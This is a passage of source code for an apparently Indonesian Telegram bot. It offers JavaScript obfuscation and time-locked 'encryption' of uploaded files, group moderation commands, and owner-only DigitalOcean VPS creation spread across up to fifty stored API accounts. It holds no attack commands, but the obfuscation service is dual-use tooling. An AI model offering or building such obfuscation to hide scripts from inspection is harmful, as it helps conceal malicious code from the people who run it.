            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCNEBULA ==========
bot.command(/^\/encnebula$/i, async (msg) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encnebula")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply("🔒 Memulai proses enkripsi Nebula Storm...");

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan Nebula Storm`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getNebulaObfuscationConfig()
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, 'nebula-enc', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `nebula-enc-${doc.file_name}`,
            },
            {
                caption: `✅ Nebula Encryption Successful\n• Type: Nebula Storm\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncNebula completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encnebula: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCSIU ==========
bot.command(/^\/encsiu$/i, async (msg) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encsiu")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply("🔒 Memulai proses enkripsi Siu Calcrick...");

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan Siu Calcrick`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getSiuCalcrickObfuscationConfig()
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, 'siu-enc', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `siu-enc-${doc.file_name}`,
            },
            {
                caption: `✅ Siu Calcrick Encryption Successful\n• Type: Siu Style\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncSiu completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encsiu: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCLOCKED ==========
bot.command(/^\/enclocked (\d+)$/i, async (msg, match) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "enclocked")) return;

        const days = match[1];
        const expiryDate = new Date();
        expiryDate.setDate(expiryDate.getDate() + parseInt(days));
        const expiryFormatted = expiryDate.toLocaleDateString();

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply(`🔒 Memulai proses enkripsi Time-Locked (${days} hari)...`);

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan Time-Locked (${days} hari)`));

        const obfuscatedCode = await obfuscateTimeLocked(fileContent, days);

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await ctx.reply(`⏰ *Masa aktif:* ${days} hari\n📅 *Kadaluwarsa:* ${expiryFormatted}`, { parse_mode: "Markdown" });

        const { filePath } = createTempFile(obfuscatedCode, `locked-${days}d`, '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `locked-${days}d-${doc.file_name}`,
            },
            {
                caption: `✅ Time-Locked Encryption Successful\n• Days: ${days}\n• Expires: ${expiryFormatted}\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncLocked (${days}d) completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error enclocked: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});
// -------------------- [ Command: unmute ] -------------------- \\
bot.command("unmute", async (ctx) => {
  try {
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa di grup.");
    }

    const admin = await ctx.telegram.getChatMember(ctx.chat.id, ctx.from.id);
    if (!["administrator", "creator"].includes(admin.status)) {
      return ctx.reply("⚠️ Hanya admin yang bisa unmute member.");
    }

    const me = await ctx.telegram.getChatMember(ctx.chat.id, ctx.botInfo.id);
    if (!["administrator", "creator"].includes(me.status)) {
      return ctx.reply("⚠️ Bot harus jadi admin dengan izin 'Restrict Members'.");
    }

    if (!ctx.message.reply_to_message) {
      return ctx.reply("❌ Harus reply pesan user yang mau di-unmute.");
    }

    const target = ctx.message.reply_to_message.from.id;
    const targetInfo = await ctx.telegram.getChatMember(ctx.chat.id, target);
    if (["administrator", "creator"].includes(targetInfo.status)) {
      return ctx.reply("⚠️ Tidak bisa unmute admin atau owner (mereka gak pernah ke-mute).");
    }

    await ctx.telegram.restrictChatMember(ctx.chat.id, target, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
      },
      until_date: 0, // 0 = permanen (no limit)
    });

    ctx.reply(`🔊 User berhasil di-unmute.`);
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal unmute user.");
  }
});

// -------------------- [ Command: mute ] -------------------- \\
bot.command("mute", async (ctx) => {
  try {
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya untuk grup.");
    }

    const user = await ctx.telegram.getChatMember(ctx.chat.id, ctx.from.id);
    if (!["administrator", "creator"].includes(user.status)) {
      return ctx.reply("⚠️ Hanya admin yang bisa mute member.");
    }

    const me = await ctx.telegram.getChatMember(ctx.chat.id, ctx.botInfo.id);
    if (!["administrator", "creator"].includes(me.status)) {
      return ctx.reply("⚠️ Bot harus jadi admin dengan izin 'Restrict Members'.");
    }

    const args = ctx.message.text.split(" ").slice(1);
    if (args.length < 1) {
      return ctx.reply("❌ Format salah.\nGunakan: reply pesan user + /mute 10m");
    }
    
    if (!ctx.message.reply_to_message) {
      return ctx.reply("❌ Harus reply pesan user yang mau di-mute.");
    }

    const target = ctx.message.reply_to_message.from.id;
    const duration = parseDuration(args[0]);
    if (!duration) return ctx.reply("❌ Durasi salah. Gunakan: 10s / 5m / 2h / 1d");

    const until = Math.floor((Date.now() + duration) / 1000);

    await ctx.telegram.restrictChatMember(ctx.chat.id, target, {
      permissions: {
        can_send_messages: false,
        can_send_media_messages: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
      },
      until_date: until,
    });

    ctx.reply(`🔇 User berhasil di-mute selama ${args[0]}.`);
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal mute user.");
  }
});

// -------------------- [ Command: Pin ] -------------------- \\
bot.command("pin", async (ctx) => {
  if (!ctx.message.reply_to_message) {
    return ctx.reply("⚠️ Balas pesan yang ingin disematkan.");
  }

  const chatType = ctx.chat.type;

  try {
    if (chatType === "group" || chatType === "supergroup") {
      const member = await ctx.telegram.getChatMember(
        ctx.chat.id,
        ctx.from.id
      );

      if (!["administrator", "creator"].includes(member.status)) {
        return ctx.reply("❌ Hanya admin/owner yang bisa menyematkan pesan.");
      }
    }

    await ctx.telegram.pinChatMessage(
      ctx.chat.id,
      ctx.message.reply_to_message.message_id,
      {
        disable_notification: true
      }
    );

    ctx.reply("📌 Pesan berhasil disematkan!");

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal menyematkan pesan.");
  }
});

// -------------------- [ Command: Unpin ] -------------------- \\
bot.command("unpin", async (ctx) => {
  if (!ctx.message.reply_to_message) {
    return ctx.reply("⚠️ Balas pesan yang ingin dilepas sematannya.");
  }

  const chatType = ctx.chat.type;

  try {
    if (chatType === "group" || chatType === "supergroup") {
      const member = await ctx.telegram.getChatMember(
        ctx.chat.id,
        ctx.from.id
      );

      if (!["administrator", "creator"].includes(member.status)) {
        return ctx.reply("❌ Hanya admin/owner yang bisa melepas sematan pesan.");
      }
    }

    await ctx.telegram.unpinChatMessage(
      ctx.chat.id,
      ctx.message.reply_to_message.message_id
    );

    ctx.reply("📌 Pesan berhasil dilepas dari sematan!");

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal melepas sematan pesan.");
  }
});

// -------------------- [ Command: Promote ] -------------------- \\
bot.command("promote", async (ctx) => {
  try {
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa dipakai di grup.");
    }

    const caller = await ctx.telegram.getChatMember(ctx.chat.id, ctx.from.id);
    if (!["administrator", "creator"].includes(caller.status)) {
      return ctx.reply("⚠️ Hanya admin/owner yang bisa menggunakan /promote.");
    }

    const me = await ctx.telegram.getChatMember(ctx.chat.id, ctx.botInfo.id);
    if (!["administrator", "creator"].includes(me.status) || !me.can_promote_members) {
      return ctx.reply("⚠️ Bot harus menjadi admin dan memiliki izin 'can_promote_members'.");
    }

    let targetId = null;
    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    } else if (ctx.message.entities && ctx.message.entities.length > 0) {
      for (const ent of ctx.message.entities) {
        if (ent.type === "text_mention" && ent.user) {
          targetId = ent.user.id;
          break;
        }
        if (ent.type === "mention") {
          const username = ctx.message.text.substr(ent.offset, ent.length); 
          try {
            const member = await ctx.telegram.getChatMember(ctx.chat.id, username);
            if (member && member.user && member.user.id) {
              targetId = member.user.id;
              break;
            }
          } catch (e) {
            try {
              const member2 = await ctx.telegram.getChatMember(ctx.chat.id, username.replace(/^@/, ""));
              if (member2 && member2.user && member2.user.id) {
                targetId = member2.user.id;
                break;
              }
            } catch (err) {
            }
          }
        }
      }
    }

    if (!targetId) {
      return ctx.reply("❌ Harus reply pesan target atau tag target dengan @username (jika tag pastikan bot bisa resolve username).");
    }
    
    const targetInfo = await ctx.telegram.getChatMember(ctx.chat.id, targetId);
    if (!targetInfo) return ctx.reply("❌ Tidak dapat mengambil info user target.");

    if (targetInfo.status === "creator") {
      return ctx.reply("⚠️ Tidak bisa mengubah status owner grup.");
    }

    if (["administrator"].includes(targetInfo.status)) {
      return ctx.reply("⚠️ User sudah admin.");
    }

    await ctx.telegram.promoteChatMember(
      ctx.chat.id,
      targetId,
      {
        can_change_info: true,
        can_post_messages: false, 
        can_edit_messages: false,
        can_delete_messages: true,
        can_invite_users: true,
        can_restrict_members: true,
        can_pin_messages: true,
        can_promote_members: false,
        is_anonymous: false
      }
    );

    ctx.reply("✅ Promoted — user berhasil dijadikan admin.");
  } catch (e) {
    console.error("PROMOTE ERROR:", e);
    ctx.reply("❌ Gagal promote user. Pastikan bot punya izin yang diperlukan dan username yang di-tag bisa di-resolve.");
  }
});

// -------------------- [ Command: demote ] -------------------- \\
bot.command("demote", async (ctx) => {
  try {
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa dipakai di grup.");
    }

    const caller = await ctx.telegram.getChatMember(ctx.chat.id, ctx.from.id);
    if (!["administrator", "creator"].includes(caller.status)) {
      return ctx.reply("⚠️ Hanya admin/owner yang bisa menggunakan /demote.");
    }

    const me = await ctx.telegram.getChatMember(ctx.chat.id, ctx.botInfo.id);
    if (!["administrator", "creator"].includes(me.status) || !me.can_promote_members) {
      return ctx.reply("⚠️ Bot harus menjadi admin dan memiliki izin.");
    }

    let targetId = null;
    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    } else if (ctx.message.entities && ctx.message.entities.length > 0) {
      for (const ent of ctx.message.entities) {
        if (ent.type === "text_mention" && ent.user) {
          targetId = ent.user.id;
          break;
        }
        if (ent.type === "mention") {
          const username = ctx.message.text.substr(ent.offset, ent.length);
          try {
            const member = await ctx.telegram.getChatMember(ctx.chat.id, username);
            if (member && member.user && member.user.id) {
              targetId = member.user.id;
              break;
            }
          } catch (e) {
            try {
              const member2 = await ctx.telegram.getChatMember(ctx.chat.id, username.replace(/^@/, ""));
              if (member2 && member2.user && member2.user.id) {
                targetId = member2.user.id;
                break;
              }
            } catch (err) {}
          }
        }
      }
    }

    if (!targetId) {
      return ctx.reply("❌ Harus reply pesan target");
    }

    const targetInfo = await ctx.telegram.getChatMember(ctx.chat.id, targetId);
    if (!targetInfo) return ctx.reply("❌ Tidak dapat mengambil info user target.");

    if (targetInfo.status === "creator") {
      return ctx.reply("⚠️ Tidak bisa mengubah status owner grup.");
    }

    if (!["administrator"].includes(targetInfo.status)) {
      return ctx.reply("⚠️ User bukan admin.");
    }

    await ctx.telegram.promoteChatMember(
      ctx.chat.id,
      targetId,
      {
        can_change_info: false,
        can_post_messages: false,
        can_edit_messages: false,
        can_delete_messages: false,
        can_invite_users: false,
        can_restrict_members: false,
        can_pin_messages: false,
        can_promote_members: false,
        is_anonymous: false
      }
    );

    ctx.reply("✅ Demoted — hak admin user berhasil dicabut.");
  } catch (e) {
    console.error("DEMOTE ERROR:", e);
    ctx.reply("❌ Gagal demote user. Pastikan bot punya izin yang diperlukan.");
  }
});

// -------------------- [ Command: /antilink ] -------------------- \\
bot.command("antilink", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di grup.");
    }

    const args = (ctx.message.text || "").split(" ").slice(1);
    if (!args[0]) {
      return ctx.reply("⚙️ Gunakan:\n/antilink on/off");
    }

    const member = await ctx.telegram.getChatMember(ctx.chat.id, ctx.from.id);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply("⚠️ Hanya admin/owner yang bisa mengatur anti-link.");
    }

    if (args[0].toLowerCase() === "on") {
      antiLinkStatus[ctx.chat.id] = true;
      return ctx.reply("✅ Anti-Link berhasil 𝗗𝗜 𝗔𝗞𝗧𝗜𝗙𝗞𝗔𝗡");
    }

    if (args[0].toLowerCase() === "off") {
      antiLinkStatus[ctx.chat.id] = false;
      return ctx.reply("❌ Anti-Link berhasil 𝗗𝗜 𝗢𝗡 𝗔𝗞𝗧𝗜𝗙𝗞𝗔𝗡");
    }

    ctx.reply("⚙️ Gunakan:\n/antilink on/off");
  } catch (e) {
    console.error("ANTILINK CMD ERROR:", e);
    ctx.reply("❌ Terjadi kesalahan.");
  }
});

// -------------------- [ Command: Add Filter ] -------------------- \\
bot.command("filter", async (ctx) => {
  try {
    if (!ctx.chat) return;
    const chatId = ctx.chat.id;
    const userId = ctx.from.id;

    const member = await ctx.telegram.getChatMember(chatId, userId);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply("<blockquote>❌ Hanya admin yang bisa menambahkan filter</blockquote>", { parse_mode: "HTML" });
    }

    filterStep[userId] = "waiting_trigger";
    ctx.reply("<blockquote>📝 Kirim Pesan <b>kata pemicu</b></blockquote>", { parse_mode: "HTML" });
  } catch (e) {
    console.error("FILTER CMD ERROR:", e);
    ctx.reply("<blockquote>❌ Terjadi kesalahan.</blockquote>", { parse_mode: "HTML" });
  }
});

// -------------------- [ Command: Delete Filter ] -------------------- \\
bot.command("dellfilter", async (ctx) => {
  try {
    if (!ctx.chat) return;
    const chatId = ctx.chat.id;
    const userId = ctx.from.id;

    const member = await ctx.telegram.getChatMember(chatId, userId);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply("<blockquote>❌ Hanya admin yang bisa menghapus filter</blockquote>", { parse_mode: "HTML" });
    }

    const data = loadFilter();
    const chatFilters = data[chatId] || {};
    const filterList = Object.keys(chatFilters);

    if (filterList.length === 0) {
      return ctx.reply("<blockquote>📭 Belum ada filter di grup ini.</blockquote>", { parse_mode: "HTML" });
    }

    let keyboard = [];
    for (let i = 0; i < filterList.length; i += 2) {
      let row = [];
      row.push(Markup.button.callback(filterList[i], `deletefilter:${filterList[i]}`));
      if (filterList[i + 1]) row.push(Markup.button.callback(filterList[i + 1], `deletefilter:${filterList[i + 1]}`));
      keyboard.push(row);
    }
    
    keyboard.push([Markup.button.callback("❌ Batal", "cancel_deletefilter")]);

    await ctx.reply(
      "<blockquote>🗑 <b>Pilih filter yang ingin dihapus:</b></blockquote>",
      { 
        parse_mode: "HTML", 
        reply_markup: { inline_keyboard: keyboard }
      }
    );
  } catch (e) {
    console.error("HAPUSFILTER CMD ERROR:", e);
    ctx.reply("<blockquote>❌ Terjadi kesalahan.</blockquote>", { parse_mode: "HTML" });
  }
});

bot.action(/^deletefilter:(.+)$/, async (ctx) => {
  try {
    const trigger = ctx.match[1];
    const chatId = ctx.chat.id;
    const userId = ctx.from.id;

    const member = await ctx.telegram.getChatMember(chatId, userId);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.answerCbQuery("❌ Hanya admin yang bisa menghapus filter", { show_alert: true });
    }

    const data = loadFilter();
    if (data[chatId] && data[chatId][trigger]) {
      delete data[chatId][trigger];
      
      // Hapus chatId
      if (Object.keys(data[chatId]).length === 0) {
        delete data[chatId];
      }
      
      saveFilter(data);
      
      await ctx.editMessageText(
        `<blockquote>✅ <b>Filter berhasil dihapus!</b>\n\nTrigger: <code>${trigger}</code></blockquote>`,
        { parse_mode: "HTML" }
      );
    } else {
      await ctx.answerCbQuery("❌ Filter tidak ditemukan!", { show_alert: true });
    }
  } catch (e) {
    console.error("DELETE FILTER ERROR:", e);
    await ctx.answerCbQuery("❌ Gagal menghapus filter", { show_alert: true });
  }
});

bot.action(/^show_delete_(.+)$/, async (ctx) => {
  try {
    const trigger = ctx.match[1];
    const chatId = ctx.chat.id;
    const userId = ctx.from.id;

    const member = await ctx.telegram.getChatMember(chatId, userId);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.answerCbQuery("❌ Hanya admin yang bisa menghapus filter", { show_alert: true });
    }

    const keyboard = [
      [Markup.button.callback("✅ Ya, hapus", `deletefilter:${trigger}`)],
      [Markup.button.callback("❌ Tidak", "cancel_deletefilter")]
    ];

    await ctx.editMessageReplyMarkup({ inline_keyboard: keyboard });
    await ctx.answerCbQuery();
  } catch (e) {
    console.error("SHOW DELETE ERROR:", e);
    await ctx.answerCbQuery("❌ Gagal", { show_alert: true });
  }
});

// menutup pesan
bot.action("close_message", async (ctx) => {
  await ctx.deleteMessage().catch(() => {});
  await ctx.answerCbQuery();
});

// batal hapus filter
bot.action("cancel_deletefilter", async (ctx) => {
  await ctx.deleteMessage().catch(() => {});
  await ctx.answerCbQuery("Dibatalkan");
});

// -------------------- [ Chat Owner Feature ] -------------------- \\\
bot.command("pesan", async (ctx) => {
  const userId = ctx.from.id;
  const userName = ctx.from.first_name || ctx.from.username || 'User';
  if (Livechat.has(userId) && Livechat.get(userId).mode === 'sending_message') {
    return ctx.reply('⚠️ Anda sudah dalam mode pengiriman pesan. Silakan ketik pesan Anda atau /batal untuk membatalkan.');
  }

  Livechat.set(userId, {
    mode: 'sending_message',
    step: 'waiting_message',
    timestamp: Date.now()
  });
  
  await ctx.reply(
    `<blockquote>📝 <b>Kirim Pesan ke Owner</b></blockquote>\n<blockquote>Silakan ketik pesan yang ingin Anda kirim ke Owner.\nKetik /batal kapan saja untuk membatalkan pengiriman.</blockquote>`,
    { parse_mode: 'HTML' }
  );
});

bot.command("batal", async (ctx) => {
  const userId = ctx.from.id;
  
  if (Livechat.has(userId) && Livechat.get(userId).mode === 'sending_message') {
    Livechat.delete(userId);
    await ctx.reply('✅ Pengiriman pesan dibatalkan.');
  } else {
    await ctx.reply('❌ Tidak ada pengiriman pesan yang sedang berlangsung.');
  }
});

// ---------- [ Command: cvps ] ------------ \\  
bot.command("cvps", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

  if (args.length < 2) {  
    return ctx.reply(
      "<blockquote>❌ <b>Format Salah!</b>\nContoh: /cvps AldzyIsHere-vps1</blockquote>",  
      { parse_mode: "HTML" }  
    );  
  }

  const hostname = args[1];

  // session  
  doSession.set(userId, { hostname, currentPage: 0 });  
  
  const totalAkun = Object.keys(apiDigitalOcean).filter(akun => 
    apiDigitalOcean[akun] && apiDigitalOcean[akun].length >= 64
  ).length;  
    
  await sendCvpsPage(ctx, userId, 0);
});

async function sendCvpsPage(ctx, userId, page) {
  const session = doSession.get(userId);
  if (!session) return;
  
  const itemsPerPage = 5;
  const startIdx = page * itemsPerPage;
  const endIdx = startIdx + itemsPerPage;
  
  let keyboard = [];
  
  for (let i = startIdx + 1; i <= Math.min(endIdx, 50); i++) {  
    let api = apiDigitalOcean[`akun${i}`];  
    const isValid = api && api.length >= 64;
    keyboard.push([  
      Markup.button.callback(
        isValid ? `V${i} ✅` : `V${i} ❌`,  
        `cvps_pick:${i}`
      )
    ]);  
  }
  
  // Tombol navigasi
  const navButtons = [];
  const totalPages = Math.ceil(50 / itemsPerPage);
  
  if (page > 0) {
    navButtons.push(Markup.button.callback("◀️ Sebelumnya", `cvps_page:${page - 1}`));
  }
  
  navButtons.push(Markup.button.callback(`${page + 1}/${totalPages}`, "no_action"));
  
  if (page < totalPages - 1) {
    navButtons.push(Markup.button.callback("Lanjutkan ▶️", `cvps_page:${page + 1}`));
  }
  
  keyboard.push(navButtons);
  
  keyboard.push([Markup.button.callback("❌ Batalkan", "cvps_cancel")]);

  const totalAkun = Object.keys(apiDigitalOcean).filter(akun => 
    apiDigitalOcean[akun] && apiDigitalOcean[akun].length >= 64
  ).length;

  await ctx.reply(
`<blockquote>📌 <b>Pembuatan VPS DigitalOcean</b>
➡️ Hostname: <b>${session.hostname}</b>
➡️ Akun Valid: <b>${totalAkun}</b>
➡️ Halaman: <b>${page + 1}/${totalPages}</b>
<b>Silakan pilih akun DigitalOcean yang ingin digunakan</b> ⬇️</blockquote>`,  
    { 
      parse_mode: "HTML",  
      reply_markup: { inline_keyboard: keyboard }
    }
  );
}

bot.action(/^cvps_page:(\d+)$/, async (ctx) => {
  const userId = ctx.from.id.toString();
  const page = parseInt(ctx.match[1]);
  
  const session = doSession.get(userId);
  if (!session) {
    return ctx.answerCbQuery("❌ Session expired, ulangi perintah /cvps");
  }
  
  session.currentPage = page;
  doSession.set(userId, session);
  
  await ctx.answerCbQuery();
  await ctx.deleteMessage().catch(() => {});
  await sendCvpsPage(ctx, userId, page);
});

bot.action("no_action", async (ctx) => {
  await ctx.answerCbQuery();
});

// ---------- [ Command: sisadroplet ] ------------ \\  
bot.command("sisadroplet", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

  doSession.set(userId, { type: 'sisadroplet', currentPage: 0 });
  await sendDoPage(ctx, userId, 0, 'sisadroplet');
});

// ---------- [ Command: listdroplet ] ------------ \\  
bot.command("listdroplet", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

  doSession.set(userId, { type: 'listdroplet', currentPage: 0 });
  await sendDoPage(ctx, userId, 0, 'listdroplet');
});

async function sendDoPage(ctx, userId, page, type) {
  const session = doSession.get(userId);
  if (!session) return;
  
  const itemsPerPage = 5;
  const startIdx = page * itemsPerPage;
  const endIdx = startIdx + itemsPerPage;
  
  let keyboard = [];
  
  for (let i = startIdx + 1; i <= Math.min(endIdx, 50); i++) {  
    let api = apiDigitalOcean[`akun${i}`];  
    const isValid = api && api.length >= 64;
    
    let callbackData;
    if (type === 'sisadroplet') {
      callbackData = `cv_check:${i}`;
    } else {
      callbackData = `ld_check:${i}`;
    }
    
    keyboard.push([  
      Markup.button.callback(
        isValid ? `V${i} ✅` : `V${i} ❌`,  
        callbackData
      )
    ]);  
  }
  
  // Tombol navigasi
  const navButtons = [];
  const totalPages = Math.ceil(50 / itemsPerPage);
  
  if (page > 0) {
    navButtons.push(Markup.button.callback("◀️ Sebelumnya", `${type}_page:${page - 1}`));
  }
  
  navButtons.push(Markup.button.callback(`${page + 1}/${totalPages}`, "no_action"));
  
  if (page < totalPages - 1) {
    navButtons.push(Markup.button.callback("Lanjutkan ▶️", `${type}_page:${page + 1}`));
  }
  
  keyboard.push(navButtons);
  
  keyboard.push([Markup.button.callback("❌ Batalkan", "do_cancel")]);

  const title = type === 'sisadroplet' ? 'Pilih Akun DigitalOcean' : 'List Droplet DigitalOcean';
  const extraText = type === 'listdroplet' ? '\nSilakan pilih akun DO.' : '';

  await ctx.reply(
`<blockquote>🌐 <b>${title}</b>${extraText}
➡️ Halaman: <b>${page + 1}/${totalPages}</b></blockquote>`,  
    { 
      parse_mode: "HTML",  
      reply_markup: { inline_keyboard: keyboard }
    }
  );
}

bot.action(/^sisadroplet_page:(\d+)$/, async (ctx) => {
  const userId = ctx.from.id.toString();
  const page = parseInt(ctx.match[1]);
  
  const session = doSession.get(userId);
  if (!session || session.type !== 'sisadroplet') {
    return ctx.answerCbQuery("❌ Session expired, ulangi perintah /sisadroplet");
  }
  
  session.currentPage = page;
  doSession.set(userId, session);
  
  await ctx.answerCbQuery();
  await ctx.deleteMessage().catch(() => {});
  await sendDoPage(ctx, userId, page, 'sisadroplet');
});

bot.action(/^listdroplet_page:(\d+)$/, async (ctx) => {
  const userId = ctx.from.id.toString();
  const page = parseInt(ctx.match[1]);
  
  const session = doSession.get(userId);
  if (!session || session.type !== 'listdroplet') {
    return ctx.answerCbQuery("❌ Session expired, ulangi perintah /listdroplet");
  }
  
  session.currentPage = page;
  doSession.set(userId, session);
  
  await ctx.answerCbQuery();
  await ctx.deleteMessage().catch(() => {});
  await sendDoPage(ctx, userId, page, 'listdroplet');
});

bot.action("do_cancel", async (ctx) => {
  const userId = ctx.from.id.toString();
  doSession.delete(userId);
  await ctx.answerCbQuery("Dibatalkan");
  await ctx.deleteMessage().catch(() => {});
});

// ---------- [ Command: deldroplet ] ------------ \\  
bot.command("deldroplet", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

  if (args.length < 2)  
    return ctx.reply("<blockquote>⚠️ <b>Contoh:</b>\n/deldroplet 123456789</blockquote>", { parse_mode: "HTML" });  

  const dropletId = args[1];
  
  // Simpan dropletId ke session
  if (!doSession) global.doSession = new Map();
  doSession.set(userId, { dropletId, currentPage: 0 });
  
  await sendDelPage(ctx, userId, 0);
});

async function sendDelPage(ctx, userId, page) {
  const session = doSession.get(userId);
  if (!session) return;
  
  const itemsPerPage = 5;
  const startIdx = page * itemsPerPage;
  const endIdx = startIdx + itemsPerPage;
  
  let keyboard = [];
  
  for (let i = startIdx + 1; i <= Math.min(endIdx, 50); i++) {  
    let api = apiDigitalOcean[`akun${i}`];  
    const isValid = api && api.length >= 64;
    
    keyboard.push([  
      Markup.button.callback(
        isValid ? `V${i} ✅` : `V${i} ❌`,  
        `del_select:${i}:${session.dropletId}`
      )
    ]);  
  }
  
  // Tombol navigasi
  const navButtons = [];
  const totalPages = Math.ceil(50 / itemsPerPage);
  
  if (page > 0) {
    navButtons.push(Markup.button.callback("◀️ Sebelumnya", `del_page:${page - 1}`));
  }
  
  navButtons.push(Markup.button.callback(`${page + 1}/${totalPages}`, "no_action"));
  
  if (page < totalPages - 1) {
    navButtons.push(Markup.button.callback("Lanjutkan ▶️", `del_page:${page + 1}`));
  }
  
  keyboard.push(navButtons);
  
  keyboard.push([Markup.button.callback("❌ Batalkan", "del_cancel")]);

  await ctx.reply(
`<blockquote>🗑 <b>HAPUS VPS</b>
🆔 Droplet ID: <b>${session.dropletId}</b>
➡️ Halaman: <b>${page + 1}/${totalPages}</b>
<b>Pilih akun DO tempat VPS berada:</b></blockquote>`,  
    { 
      parse_mode: "HTML",  
      reply_markup: { inline_keyboard: keyboard }
    }
  );
}

bot.action(/^del_page:(\d+)$/, async (ctx) => {
  const userId = ctx.from.id.toString();
  const page = parseInt(ctx.match[1]);
  
  const session = doSession.get(userId);
  if (!session) {
